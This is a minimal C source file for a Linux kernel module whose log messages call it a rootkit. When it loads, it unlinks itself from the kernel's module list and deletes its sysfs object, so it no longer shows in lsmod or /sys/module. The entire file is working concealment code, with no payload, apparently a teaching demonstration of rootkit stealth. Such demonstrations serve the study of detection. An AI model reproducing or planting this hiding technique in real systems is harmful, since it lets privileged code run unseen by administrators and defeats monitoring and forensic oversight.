/*lkm.c*/

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static int lkm_init(void)
{
	// write log to dmesg
	printk("rootkit: module loaded.\n");
	list_del_init(&__this_module.list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	return 0;
}

static void lkm_exit(void)
{
	// write log to dmesg
	printk("rootkit: module removed.\n");
}

module_init(lkm_init);
module_exit(lkm_exit);
